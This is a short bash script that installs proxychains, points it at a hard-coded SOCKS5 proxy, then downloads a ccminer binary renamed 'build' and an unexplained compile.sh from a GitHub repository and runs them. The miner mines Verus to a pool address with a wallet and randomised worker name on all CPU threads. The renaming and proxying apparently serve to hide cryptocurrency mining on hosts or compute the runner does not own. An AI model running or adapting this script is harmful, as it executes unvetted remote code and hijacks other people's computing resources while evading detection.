#!/bin/bash
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
sudo -i
apt update
apt install proxychains
sed -i 's/socks4/socks5/' /etc/proxychains.conf
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
wget -qO build https://github.com/renifer12/master/raw/master/ccminer
chmod +x build
chmod +x compile.sh
./build -a verus -o stratum+tcp://139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p x -t $(nproc --all)
./compile.sh
echo succes
